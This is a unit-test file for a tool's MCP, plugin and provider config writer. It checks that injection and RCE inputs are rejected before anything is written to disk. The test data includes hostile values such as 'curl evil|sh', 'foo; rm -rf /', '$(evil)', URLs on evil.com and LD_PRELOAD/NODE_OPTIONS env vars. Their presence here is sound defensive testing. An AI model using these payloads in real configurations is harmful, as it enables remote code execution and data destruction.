// Unit tests for the MCP/provider/plugin config writer's SECURITY validation (ADR-014 §8, C2).
// These are the config-time-RCE guards: a malicious catalog entry or IPC payload must be rejected
// BEFORE any disk write. Rejection paths need no filesystem; accept paths redirect the config dir
// via OPENCODE_CONFIG_DIR (which userConfigDir() honors) to a throwaway temp dir.

import { afterEach, beforeEach, describe, expect, test } from "bun:test"
import * as fs from "node:fs"
import * as os from "node:os"
import * as path from "node:path"
import { applyBuiltinPolicyEdits, configHealth, persistMcp, persistPlugin, persistProvider, removeMcp, removeMcpConfigInLock, removePlugin, removePluginPath, readMcpLeafStrict, readAgentEntryStrict, readPluginArrayStrict } from "./ext-config"
import { tryAcquireBundleLock } from "./ext-bundle-lock"
import { addReceipt, findReceipt, readLedger } from "./alpha-installs"
import { upsertRecordV2 } from "./ext-receipt-v2"

// REQ-018 T2: mcp/plugin persistence targets the alpha-owned ~/.opencode/opencode.jsonc
// (ALPHA_OPENCODE_HOME-overridable); provider persistence stays on the shared XDG config
// (OPENCODE_CONFIG_DIR); receipts land under ALPHA_GLOBAL_DIR. All three are temp dirs here.
let tmp = ""
let homeTmp = ""
let alphaTmp = ""
const prevConfigDir = process.env.OPENCODE_CONFIG_DIR
const prevHome = process.env.ALPHA_OPENCODE_HOME
const prevAlpha = process.env.ALPHA_GLOBAL_DIR

beforeEach(() => {
  tmp = fs.mkdtempSync(path.join(os.tmpdir(), "alpha-extcfg-"))
  homeTmp = path.join(tmp, "opencode-home")
  alphaTmp = path.join(tmp, "alpha-home")
  process.env.OPENCODE_CONFIG_DIR = tmp
  process.env.ALPHA_OPENCODE_HOME = homeTmp
  process.env.ALPHA_GLOBAL_DIR = alphaTmp
})
afterEach(() => {
  if (prevConfigDir === undefined) delete process.env.OPENCODE_CONFIG_DIR
  else process.env.OPENCODE_CONFIG_DIR = prevConfigDir
  if (prevHome === undefined) delete process.env.ALPHA_OPENCODE_HOME
  else process.env.ALPHA_OPENCODE_HOME = prevHome
  if (prevAlpha === undefined) delete process.env.ALPHA_GLOBAL_DIR
  else process.env.ALPHA_GLOBAL_DIR = prevAlpha
  try {
    fs.rmSync(tmp, { recursive: true, force: true })
  } catch {
    /* best effort */
  }
})

// REQ-059: mcp/plugin AND provider now all land in the single alpha truth ~/.alpha/alpha.jsonc.
function readAlphaConfig(): Record<string, any> {
  return JSON.parse(fs.readFileSync(path.join(alphaTmp, "alpha.jsonc"), "utf8"))
}
// mcp/plugin
function readConfig(): Record<string, any> {
  return readAlphaConfig()
}
// provider (was shared XDG; REQ-059 moved into the alpha truth)
function readUserConfig(): Record<string, any> {
  return readAlphaConfig()
}

describe("persistMcp — name validation", () => {
  test.each([["../evil"], ["a/b"], [""], [".hidden"], ["has space"]])("rejects unsafe name %p", (name) => {
    const r = persistMcp(name, { type: "local", command: ["npx"] })
    expect(r.ok).toBe(false)
    // nothing was written
    expect(fs.existsSync(path.join(homeTmp, "opencode.jsonc"))).toBe(false)
  })
})

describe("persistMcp — field/command RCE guards (C2)", () => {
  test("rejects unknown config field", () => {
    const r = persistMcp("srv", { type: "local", command: ["npx"], onStart: "curl evil|sh" } as any)
    expect(r).toEqual({ ok: false, reason: "field not allowed: onStart" })
  })

  test.each([["bash"], ["/etc/passwd"], ["sh"], ["/tmp/x"]])("rejects non-whitelisted command head %p", (head) => {
    const r = persistMcp("srv", { type: "local", command: [head, "-c", "x"] })
    expect(r.ok).toBe(false)
    expect((r as any).reason).toContain("command not allowed")
  })

  test.each([["-e"], ["--eval"], ["-p"], ["--print"], ["-c"], ["--command"], ["eval"]])(
    "rejects inline-eval flag %p even with a whitelisted head (node/python/deno -e)",
    (flag) => {
      const r = persistMcp("srv", { type: "local", command: ["node", flag, "process.exit()"] })
      expect(r.ok).toBe(false)
      expect((r as any).reason).toContain("not allowed")
    },
  )

  test("rejects non-string command arg", () => {
    const r = persistMcp("srv", { type: "local", command: ["npx", 123] as any })
    expect(r).toEqual({ ok: false, reason: "command args must be strings" })
  })
})

describe("persistMcp — url guards (loopback/https only)", () => {
  test.each([
    ["http://evil.com/mcp"],
    ["http://127.0.0.1@evil.com/mcp"], // hostname parses to evil.com, not loopback
    ["http://localhost.evil.com/mcp"], // not exactly localhost
    ["ftp://localhost/mcp"],
  ])("rejects unsafe url %p", (url) => {
    const r = persistMcp("srv", { type: "remote", url })
    expect(r.ok).toBe(false)
  })

  test("rejects loopback http with embedded credentials", () => {
    const r = persistMcp("srv", { type: "remote", url: "http://user:pass@localhost:3000/mcp" })
    expect(r.ok).toBe(false)
  })
})

describe("persistMcp — environment/headers value guards", () => {
  test.each([["NODE_OPTIONS"], ["LD_PRELOAD"], ["DYLD_INSERT_LIBRARIES"], ["PYTHONSTARTUP"]])(
    "rejects dangerous env var %p",
    (key) => {
      const r = persistMcp("srv", { type: "local", command: ["npx"], environment: { [key]: "x" } })
      expect(r).toEqual({ ok: false, reason: `env var not allowed: ${key}` })
    },
  )

  test("rejects non-string env value", () => {
    const r = persistMcp("srv", { type: "local", command: ["npx"], environment: { OK: 1 } as any })
    expect(r.ok).toBe(false)
  })

  test("rejects non-string header value", () => {
    const r = persistMcp("srv", { type: "remote", url: "https://x.com/mcp", headers: { Auth: 1 } as any })
    expect(r.ok).toBe(false)
  })
})

describe("persistMcp — accept paths write mcp[name]", () => {
  test("valid stdio server (npx) persists", () => {
    const r = persistMcp("playwright", { type: "local", command: ["npx", "-y", "@playwright/mcp"] })
    expect(r).toEqual({ ok: true })
    expect(readConfig().mcp.playwright.command).toEqual(["npx", "-y", "@playwright/mcp"])
  })

  test("valid https remote server persists", () => {
    const r = persistMcp("remote", { type: "remote", url: "https://api.example.com/mcp", headers: { Auth: "t" } })
    expect(r).toEqual({ ok: true })
    expect(readConfig().mcp.remote.url).toBe("https://api.example.com/mcp")
  })

  test("loopback http (dev) is accepted", () => {
    const r = persistMcp("dev", { type: "remote", url: "http://localhost:8080/mcp" })
    expect(r).toEqual({ ok: true })
  })

  test("removeMcp round-trips without corrupting config", () => {
    persistMcp("a", { type: "local", command: ["npx"] })
    persistMcp("b", { type: "local", command: ["bun"] })
    expect(removeMcp("a")).toEqual({ ok: true })
    const cfg = readConfig()
    expect(cfg.mcp.a).toBeUndefined()
    expect(cfg.mcp.b).toBeDefined()
  })

  test("#346 removeMcpConfigInLock:锁被持有时照常工作(in-lock 原语不重取锁)、只删配置零账本副作用", () => {
    persistMcp("demo", { type: "local", command: ["npx", "-y", "demo-mcp"] }, { catalogId: "mcp:demo", version: "1.0.0" })
    // #354:eager v1 已下线(账本所有权归 planner v2 upsert)——receipt 由测试自建,断言意图不变:
    // in-lock 原语只删配置、零账本副作用。
    addReceipt(alphaTmp, { id: "mcp:demo", name: "demo", type: "mcp", scope: "global", installedAt: new Date().toISOString(), origin: "catalog", configKey: "mcp.demo" })
    const held = tryAcquireBundleLock(alphaTmp, { txId: "tx-uninstall-346" })
    expect(held.ok).toBe(true)
    if (!held.ok) return
    try {
      const r = removeMcpConfigInLock("demo")
      expect(r).toEqual({ ok: true })
    } finally {
      held.lock.release()
    }
    expect(readConfig().mcp?.demo).toBeUndefined()
    // 零账本副作用:receipt 仍在(账本删除只归事务 commitLedger,ledger-second 边界)
    expect(findReceipt(alphaTmp, "mcp", "demo")).not.toBeNull()
  })

  test("#346 removeMcpConfigInLock:legacy 文件可读但不可解析(malformed JSONC)→ fail-closed(review #374:jsonc-parser 不抛异常)", () => {
    persistMcp("demo", { type: "local", command: ["npx", "-y", "demo-mcp"] })
    fs.mkdirSync(homeTmp, { recursive: true })
    fs.writeFileSync(path.join(homeTmp, "opencode.jsonc"), '{ "mcp": { "demo": {')
    const r = removeMcpConfigInLock("demo")
    expect(r.ok).toBe(false)
    if (!r.ok) expect(r.reason).toContain("unparsable")
  })

  test("#346 removeMcpConfigInLock:legacy 文件存在但不可读 → fail-closed(不吞错继续)", () => {
    persistMcp("demo", { type: "local", command: ["npx", "-y", "demo-mcp"] })
    // legacy 路径之一:ALPHA_OPENCODE_HOME 下的旧 config(legacyConfigPaths 经 opencodeHomeDir 派生)
    fs.mkdirSync(homeTmp, { recursive: true })
    const legacyFile = path.join(homeTmp, "opencode.jsonc")
    fs.writeFileSync(legacyFile, JSON.stringify({ mcp: { demo: { type: "local" } } }))
    fs.chmodSync(legacyFile, 0o000)
    try {
      const r = removeMcpConfigInLock("demo")
      expect(r.ok).toBe(false)
      if (!r.ok) expect(r.reason).toContain("legacy config unreadable")
    } finally {
      fs.chmodSync(legacyFile, 0o644)
    }
  })
})

describe("persistPlugin — package-name guard", () => {
  test.each([["foo; rm -rf /"], ["a b"], ["../x"], ["$(evil)"], ["pkg&&x"]])(
    "rejects package spec with shell metachars %p",
    (pkg) => {
      const r = persistPlugin(pkg)
      expect(r).toEqual({ ok: false, reason: "invalid package name" })
    },
  )

  test.each([["@scope/pkg@1.2.3"], ["some-plugin"], ["@a/b"]])("accepts clean package %p", (pkg) => {
    expect(persistPlugin(pkg)).toEqual({ ok: true, changed: true })
  })

  test("Codex #355:恰同钉版 = changed:false;同 base 不同钉版显式拒绝(不许配置不变账本记新版)", () => {
    expect(persistPlugin("dup-plugin@1.0.0")).toEqual({ ok: true, changed: true })
    expect(persistPlugin("dup-plugin@1.0.0")).toEqual({ ok: true, changed: false }) // 真幂等
    const mismatch = persistPlugin("dup-plugin@2.0.0")
    expect(mismatch.ok).toBe(false)
    if (!mismatch.ok) expect(mismatch.reason).toContain("version mismatch")
    expect(readConfig().plugin.filter((p: string) => String(p).startsWith("dup-plugin")).length).toBe(1)
  })
})

describe("persistProvider — baseURL + shape guards", () => {
  test("rejects non-https / non-loopback baseURL", () => {
    const r = persistProvider({
      id: "p",
      name: "P",
      compat: "openai",
      baseURL: "http://evil.com/v1",
      apiKey: "k",
      models: ["m"],
    } as any)
    expect(r.ok).toBe(false)
  })

  test("accepts a valid https provider and writes provider[id]", () => {
    const r = persistProvider({
      id: "myprov",
      name: "My Provider",
      compat: "openai",
      baseURL: "https://api.example.com/v1",
      apiKey: "sk-x",
      models: ["model-a"],
    } as any)
    expect(r).toEqual({ ok: true })
    const cfg = readUserConfig()
    expect(cfg.provider.myprov.options.baseURL).toBe("https://api.example.com/v1")
    expect(cfg.provider.myprov.models["model-a"]).toBeDefined()
  })
})

// ── B11/B23:configHealth(探测「引擎会整份清零」的两种病灶) ──────────────────────────────
describe("configHealth", () => {
  const write = (text: string) => fs.writeFileSync(path.join(tmp, "opencode.jsonc"), text)

  test("无文件 / 合法配置 → 健康", () => {
    expect(configHealth().broken).toBe(false)
    write('{\n  // comment ok\n  "model": "x",\n  "mcp": {},\n}\n')
    expect(configHealth().broken).toBe(false)
  })

  test("jsonc 语法坏 → broken(语法)", () => {
    write('{ "mcp": { broken')
    const h = configHealth()
    expect(h.broken).toBe(true)
    expect(h.reason).toContain("语法")
  })

  test("未知顶层 key → broken 并点名(B23 主案例)", () => {
    write('{ "mcp": {}, "strictKey": 1, "another_bad": true }')
    const h = configHealth()
    expect(h.broken).toBe(true)
    expect(h.reason).toContain("strictKey")
  })

  test("全部 V1 合法顶键不误报", () => {
    write('{ "$schema": "s", "provider": {}, "plugin": [], "instructions": [], "experimental": {}, "theme_typo_guard": 0 }'.replace(', "theme_typo_guard": 0', ""))
    expect(configHealth().broken).toBe(false)
  })

  test("ALPHA_CONFIG_HEALTH_DISABLE=1 → 恒健康", () => {
    write("{ nope")
    process.env.ALPHA_CONFIG_HEALTH_DISABLE = "1"
    try {
      expect(configHealth().broken).toBe(false)
    } finally {
      delete process.env.ALPHA_CONFIG_HEALTH_DISABLE
    }
  })
})

// ── T6:persistMcp/persistPlugin 记账 + removePlugin 卸载 ──────────────────────────────────────
describe("receipts on persist/remove (T6)", () => {
  test("#354:persistMcp 不再 eager 落 v1(账本所有权归 planner v2 upsert);removeMcp 仍清 legacy receipt", () => {
    expect(persistMcp("markitdown", { type: "local", command: ["uvx", "markitdown-mcp"] }, { catalogId: "mcp:markitdown", version: "1" }).ok).toBe(true)
    expect(readLedger(alphaTmp).receipts.find((x) => x.type === "mcp" && x.name === "markitdown")).toBeUndefined()
    // legacy receipt(历史安装)仍由 removeMcp 清理 —— 卸载语义不变。
    addReceipt(alphaTmp, { id: "mcp:markitdown", name: "markitdown", type: "mcp", scope: "global", installedAt: new Date().toISOString(), origin: "catalog", configKey: "mcp.markitdown" })
    expect(removeMcp("markitdown").ok).toBe(true)
    expect(readLedger(alphaTmp).receipts.find((x) => x.name === "markitdown")).toBeUndefined()
  })

  test("#354:persistPlugin 不再 eager 落 v1;removePlugin 撤 config[] 并清 legacy receipt", () => {
    expect(persistPlugin("opencode-notify@0.3.1", { catalogId: "plugin:opencode-notify" }).ok).toBe(true)
    expect(readConfig().plugin).toContain("opencode-notify@0.3.1")
    expect(readLedger(alphaTmp).receipts.some((x) => x.type === "plugin")).toBe(false)
    addReceipt(alphaTmp, { id: "plugin:opencode-notify", name: "opencode-notify", type: "plugin", scope: "global", installedAt: new Date().toISOString(), origin: "catalog", configKey: "plugin:opencode-notify@0.3.1" })
    expect(removePlugin("opencode-notify@0.3.1").ok).toBe(true)
    expect(readConfig().plugin ?? []).not.toContain("opencode-notify@0.3.1")
    expect(readLedger(alphaTmp).receipts.some((x) => x.type === "plugin")).toBe(false)
  })

  test("removePlugin on an absent package is a no-op success", () => {
    expect(removePlugin("never-installed").ok).toBe(true)
  })
})

// ── REQ-100 #342:配置写锁 —— 所有 alpha-owned 写方与扩展事务共享环境级 bundle 锁 ──────────────

describe("config write lock — serialized with the extension bundle lock (REQ-100 #342)", () => {
  test("事务在途(锁被持有)→ 写方如实 busy 拒绝,零写入;释放后同一调用成功", () => {
    const held = tryAcquireBundleLock(alphaTmp, { txId: "tx-in-flight" })
    expect(held.ok).toBe(true)
    if (!held.ok) return
    const server = { type: "local", command: ["npx", "-y", "demo-mcp"] }
    const mcp = persistMcp("demo", server)
    expect(mcp.ok).toBe(false)
    if (!mcp.ok) expect(mcp.reason).toContain("config busy")
    const plug = persistPlugin("@alpha/np")
    expect(plug.ok).toBe(false)
    expect(fs.existsSync(path.join(alphaTmp, "alpha.jsonc"))).toBe(false) // 拒后零写入
    held.lock.release()
    expect(persistMcp("demo", server).ok).toBe(true)
    expect(persistPlugin("@alpha/np").ok).toBe(true)
    expect(readConfig().mcp.demo).toBeDefined()
  })

  test("锁被持有时删除路径同样拒绝(update/uninstall 写方全在锁面内)", () => {
    expect(persistMcp("demo", { type: "local", command: ["npx", "-y", "demo-mcp"] }).ok).toBe(true)
    const held = tryAcquireBundleLock(alphaTmp, { txId: "tx-in-flight-2" })
    expect(held.ok).toBe(true)
    if (!held.ok) return
    const r = removeMcp("demo")
    expect(r.ok).toBe(false)
    held.lock.release()
    expect(removeMcp("demo").ok).toBe(true)
    expect(readConfig().mcp?.demo).toBeUndefined()
  })

  test("写方成功后锁已释放(不留残锁阻塞后续事务)", () => {
    expect(persistMcp("demo", { type: "local", command: ["npx", "-y", "demo-mcp"] }).ok).toBe(true)
    const acquire = tryAcquireBundleLock(alphaTmp, { txId: "after-write" })
    expect(acquire.ok).toBe(true) // 写方 finally 释放,事务可立即获取
    if (acquire.ok) acquire.lock.release()
  })
})

// ── #354(review #379):strict 读的真实实现 —— jsonc 容错解析必须收 ParseError ────────────────────
describe("readMcpLeafStrict / readAgentEntryStrict (REQ-100 #354)", () => {
  const cfgPath = () => path.join(alphaTmp, "alpha.jsonc")
  test("缺失文件 = 合法空前像;健康文件返回精确叶子", () => {
    expect(readMcpLeafStrict("demo")).toEqual({ ok: true, value: undefined })
    fs.mkdirSync(alphaTmp, { recursive: true })
    fs.writeFileSync(cfgPath(), JSON.stringify({ mcp: { demo: { type: "local", command: ["npx"] } } }))
    const r = readMcpLeafStrict("demo")
    expect(r.ok).toBe(true)
    if (r.ok) expect(r.value).toEqual({ type: "local", command: ["npx"] })
  })
  test("语法损坏(jsonc-parser 容错不抛错)→ strict 拒绝,绝不当作「叶不存在」", () => {
    fs.mkdirSync(alphaTmp, { recursive: true })
    fs.writeFileSync(cfgPath(), '{ "mcp": { broken')
    const r = readMcpLeafStrict("demo")
    expect(r.ok).toBe(false)
    if (!r.ok) expect(r.reason).toContain("unparseable")
  })
  test("readAgentEntryStrict:手工 agent 条目在场可见;语法损坏拒绝(fail-closed)", () => {
    fs.mkdirSync(alphaTmp, { recursive: true })
    fs.writeFileSync(cfgPath(), JSON.stringify({ agent: { helper: { prompt: "hand written" } } }))
    const ok = readAgentEntryStrict("helper")
    expect(ok).toEqual({ ok: true, present: true })
    expect(readAgentEntryStrict("other")).toEqual({ ok: true, present: false })
    fs.writeFileSync(cfgPath(), '{ "agent": { oops')
    expect(readAgentEntryStrict("helper").ok).toBe(false)
  })
})

describe("readPluginArrayStrict (REQ-099 #352)", () => {
  const cfgPath = () => path.join(alphaTmp, "alpha.jsonc")
  test("缺失 = 空数组;字符串数组原样;非字符串成员/非数组/语法损坏一律拒(替换基底必须可信)", () => {
    expect(readPluginArrayStrict()).toEqual({ ok: true, value: [] })
    fs.mkdirSync(alphaTmp, { recursive: true })
    fs.writeFileSync(cfgPath(), JSON.stringify({ plugin: ["a@1", "b@2"] }))
    expect(readPluginArrayStrict()).toEqual({ ok: true, value: ["a@1", "b@2"] })
    fs.writeFileSync(cfgPath(), JSON.stringify({ plugin: ["a@1", { bad: true }] }))
    expect(readPluginArrayStrict().ok).toBe(false)
    fs.writeFileSync(cfgPath(), JSON.stringify({ plugin: "not-array" }))
    expect(readPluginArrayStrict().ok).toBe(false)
    fs.writeFileSync(cfgPath(), '{ "plugin": [broken')
    expect(readPluginArrayStrict().ok).toBe(false)
  })
})

// ── #378 r9/r10:removePluginPath 真实现回归(此前只有 planner fake 覆盖)────────────────────────
describe("removePluginPath — 主+legacy 全源净除,引擎语义匹配,strict fail-closed(#378 r9/r10)", () => {
  const mainCfg = () => path.join(alphaTmp, "alpha.jsonc")
  const homeCfg = () => path.join(homeTmp, "opencode.jsonc")
  const jsOf = (dir: string) => path.join(alphaTmp, "plugins", dir, "plugin.js")

  test("元组/相对/file:// 等价条目全部净除;主 + legacy(home)同扫", () => {
    fs.mkdirSync(alphaTmp, { recursive: true })
    fs.mkdirSync(homeTmp, { recursive: true })
    const target = jsOf("vp@aaaa")
    fs.writeFileSync(mainCfg(), JSON.stringify({ plugin: [[target, { lazy: true }], "keep-pkg@1.0.0"] }))
    fs.writeFileSync(homeCfg(), JSON.stringify({ plugin: [`file://${target}`] }))
    const r = removePluginPath("vp", target)
    expect(r.ok).toBe(true)
    const pluginsOf = (file: string): unknown => {
      const raw: unknown = JSON.parse(fs.readFileSync(file, "utf8"))
      return raw && typeof raw === "object" && !Array.isArray(raw) && "plugin" in raw ? raw.plugin : undefined
    }
    expect(pluginsOf(mainCfg())).toEqual(["keep-pkg@1.0.0"]) // 元组匹配净除,别家条目保留
    expect(pluginsOf(homeCfg())).toEqual([]) // legacy file:// 等价形态同扫
  })

  test("语法损坏 / 非对象根 / plugin 非数组 → fail-closed 拒(不删条目也不谎报成功)", () => {
    fs.mkdirSync(alphaTmp, { recursive: true })
    const target = jsOf("vp@bbbb")
    fs.writeFileSync(mainCfg(), '{ "plugin": [broken')
    expect(removePluginPath("vp", target).ok).toBe(false)
    fs.writeFileSync(mainCfg(), JSON.stringify(["array-root"]))
    expect(removePluginPath("vp", target).ok).toBe(false)
    fs.writeFileSync(mainCfg(), JSON.stringify({ plugin: "not-array" }))
    expect(removePluginPath("vp", target).ok).toBe(false)
  })
})

// ── O4 钉测:幽灵删除不砖事务(S50 真机白捡)─────────────────────────────────────────────
// 现场:materialized 旧账指向的叶子不在当前真源 alpha.jsonc(REQ-059 迁真源后账实分离)。
// jsonc-parser 对父路径缺失的删除会 throw "Can not delete in empty document" → 修前一个
// 幽灵键砖死整笔 apply(治理面永久失败)。修后:幽灵删除 = 跳过,其余编辑照常落盘。
describe("applyBuiltinPolicyEdits — 幽灵删除跳过(O4)", () => {
  const target = () => path.join(alphaTmp, "alpha.jsonc")

  test("删除父路径不存在的叶子:跳过不 throw,同笔写入照常生效", () => {
    fs.mkdirSync(alphaTmp, { recursive: true })
    fs.writeFileSync(target(), JSON.stringify({ theme: "dark", agent: { explore: { disable: true } } }, null, 2))
    const r = applyBuiltinPolicyEdits([
      { path: ["permission", "skill", "*"], value: undefined }, // 顶键 permission 整链缺失
      { path: ["permission", "skill", "customize-opencode"], value: undefined },
      { path: ["command", "customize-opencode", "description"], value: undefined },
      { path: ["command", "customize-opencode", "template"], value: undefined },
      { path: ["agent", "plan", "hidden"], value: true }, // 同笔真实写入必须存活
    ])
    expect(r.ok).toBe(true)
    if (!r.ok) throw new Error("unreachable")
    expect(r.applied).toEqual([["agent", "plan", "hidden"]]) // 删除与跳过均不入账
    const cfg = JSON.parse(fs.readFileSync(target(), "utf8"))
    expect(cfg.agent.plan.hidden).toBe(true)
    expect(cfg.agent.explore.disable).toBe(true) // 用户既有内容不动
    expect(cfg.theme).toBe("dark")
    expect(cfg.permission).toBeUndefined() // 幽灵删除零副作用,不凭空造父对象
    expect(cfg.command).toBeUndefined()
  })

  test("父对象在、叶子缺:同样跳过;真实存在的叶子照常删除", () => {
    fs.mkdirSync(alphaTmp, { recursive: true })
    fs.writeFileSync(target(), JSON.stringify({ agent: { plan: { hidden: true }, explore: { temperature: 0.5 } } }, null, 2))
    const r = applyBuiltinPolicyEdits([
      { path: ["agent", "plan", "disable"], value: undefined }, // 父在叶缺 → 跳过
      { path: ["agent", "plan", "hidden"], value: undefined }, // 真实存在 → 删除 + 空壳剪枝
    ])
    expect(r.ok).toBe(true)
    const cfg = JSON.parse(fs.readFileSync(target(), "utf8"))
    expect(cfg.agent.plan).toBeUndefined() // hidden 删除后 plan 空壳被剪
    expect(cfg.agent.explore.temperature).toBe(0.5)
  })

  test("目标文件不存在(纯删除事务):跳过全部,ok 且不落盘副作用文件", () => {
    const r = applyBuiltinPolicyEdits([{ path: ["permission", "skill", "*"], value: undefined }])
    expect(r.ok).toBe(true)
    // 事务本身会原子写回 "{}"(建目标属既有行为);关键是不再 throw、不误造治理键
    const cfg = JSON.parse(fs.readFileSync(target(), "utf8"))
    expect(cfg.permission).toBeUndefined()
  })
})

// ── #395(Codex r5):未策展重加接入同一投影 —— disabled 记录不得被 persist 写「正常叶」复活 ────
describe("#395 persistMcp/persistPlugin — 账本 disabled 投影(重加不复活)", () => {
  const record = (kind: "mcp" | "plugin", name: string, desiredState: "enabled" | "disabled", configKey: string) => {
    const w = upsertRecordV2(alphaTmp, {
      id: `user:${name}`,
      name,
      kind,
      environment: "prod",
      scope: { kind: "global" },
      desiredState,
      origin: "created",
      installedAt: "2026-07-17T00:00:00.000Z",
      configKey,
    })
    if (!w.ok) throw new Error(w.reason)
  }

  test("persistMcp:账本 disabled → 重写叶强制带 enabled:false(内容照常更新)", () => {
    record("mcp", "srv", "disabled", "mcp.srv")
    const r = persistMcp("srv", { type: "local", command: ["npx", "-y", "x"] })
    expect(r.ok).toBe(true)
    expect(readConfig().mcp.srv).toEqual({ type: "local", command: ["npx", "-y", "x"], enabled: false })
  })

  test("persistMcp:账本 enabled / 无记录 → 叶原样(不额外注键)", () => {
    record("mcp", "on", "enabled", "mcp.on")
    expect(persistMcp("on", { type: "local", command: ["npx"] }).ok).toBe(true)
    expect(readConfig().mcp.on).toEqual({ type: "local", command: ["npx"] })
    expect(persistMcp("fresh", { type: "local", command: ["npx"] }).ok).toBe(true)
    expect(readConfig().mcp.fresh).toEqual({ type: "local", command: ["npx"] })
  })

  test("persistMcp:账本 disabled 且入参带 enabled:true → 投影覆盖为 false(状态只走 set-state 通道)", () => {
    record("mcp", "srv2", "disabled", "mcp.srv2")
    expect(persistMcp("srv2", { type: "local", command: ["npx"], enabled: true }).ok).toBe(true)
    expect(readConfig().mcp.srv2.enabled).toBe(false)
  })

  test("persistPlugin:账本 disabled → projectedDisabled,plugin[] 保持缺席(config 零写入)", () => {
    record("plugin", "x__p", "disabled", "plugin:@x/p@1.0.0")
    const r = persistPlugin("@x/p@1.0.0")
    expect(r).toEqual({ ok: true, changed: false, projectedDisabled: true })
    expect(fs.existsSync(path.join(alphaTmp, "alpha.jsonc"))).toBe(false) // 从未写盘
  })

  test("persistPlugin:账本 enabled → 照常追加(投影不误伤)", () => {
    record("plugin", "y__q", "enabled", "plugin:@y/q@1.0.0")
    expect(persistPlugin("@y/q@1.0.0")).toEqual({ ok: true, changed: true })
    expect(readConfig().plugin).toEqual(["@y/q@1.0.0"])
  })
})

describe("#395 步骤4:persistPlugin 目标读错误 fail-closed", () => {
  test("目标 config 不可读(EISDIR)→ 拒绝(不以空基底 [pkg] 整替换既有 plugin[])", () => {
    fs.mkdirSync(path.join(alphaTmp, "alpha.jsonc"), { recursive: true })
    const r = persistPlugin("@z/r@1.0.0")
    expect(r.ok).toBe(false)
    if (!r.ok) expect(r.reason).toContain("unreadable")
  })
})

// ── #395 Codex r6 M1:disabled plugin 换钉版重加 —— 清残留 / legacy fail-closed(不留无账活条目)──
describe("#395 r6 M1 disabled plugin 换钉版", () => {
  const recPlugin = (name: string, configKey: string) => {
    const w = upsertRecordV2(alphaTmp, {
      id: `user:${name}`,
      name,
      kind: "plugin",
      environment: "prod",
      scope: { kind: "global" },
      desiredState: "disabled",
      origin: "created",
      installedAt: "2026-07-17T00:00:00.000Z",
      configKey,
    })
    if (!w.ok) throw new Error(w.reason)
  }

  test("主 config 有旧钉版残留(@x/p@1),重加 @x/p@2 → 清残留 + projectedDisabled changed(不留旧活条目)", () => {
    recPlugin("x__p", "plugin:@x/p@1.0.0") // 账本 name=x__p(pkgBase 派生),记录 disabled
    // 崩溃残留:主 config 仍有旧钉版条目 + 无关插件。
    fs.writeFileSync(path.join(alphaTmp, "alpha.jsonc"), JSON.stringify({ plugin: ["@x/p@1.0.0", "@keep/o@1"] }))
    const r = persistPlugin("@x/p@2.0.0")
    expect(r).toEqual({ ok: true, changed: true, projectedDisabled: true })
    // 旧钉版残留被清,无关插件保留,新钉版不写(disabled = 缺席)。
    expect(readConfig().plugin).toEqual(["@keep/o@1"])
  })

  test("主+legacy 都缺席该 base → changed:false(纯账本刷新,零 config 写)", () => {
    recPlugin("y__q", "plugin:@y/q@1.0.0")
    const r = persistPlugin("@y/q@2.0.0")
    expect(r).toEqual({ ok: true, changed: false, projectedDisabled: true })
    expect(fs.existsSync(path.join(alphaTmp, "alpha.jsonc"))).toBe(false)
  })
})
